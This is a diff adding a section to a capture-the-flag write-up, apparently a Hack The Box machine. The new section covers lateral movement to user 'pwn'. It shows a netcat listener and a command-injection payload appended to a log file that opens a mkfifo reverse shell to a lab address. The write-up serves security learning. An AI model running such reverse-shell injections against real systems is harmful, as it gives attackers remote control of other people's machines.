@@ -48,7 +48,15 @@ uid=1000(kid) gid=1000(kid) groups=1000(kid)
 ```
 <br/><br/>
 The user.txt flag can be found under the usual user home directory (/home/<user>/).
-  
+ 
+There is another user `pwn`, the plan was to find a way to this account. I used a [secjuice]() resource for this part as I hit a roadblock. 
+ ```
+ $ nc -nvlp 4445
+ ```
+ This payload contains a reverse shell that we can push to the log file `hackers`. 
+ ```
+ echo "1 2 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4445 >/tmp/f #" >> hackers
+ ```
 ```
 TO BE CONTINUED  
 ```
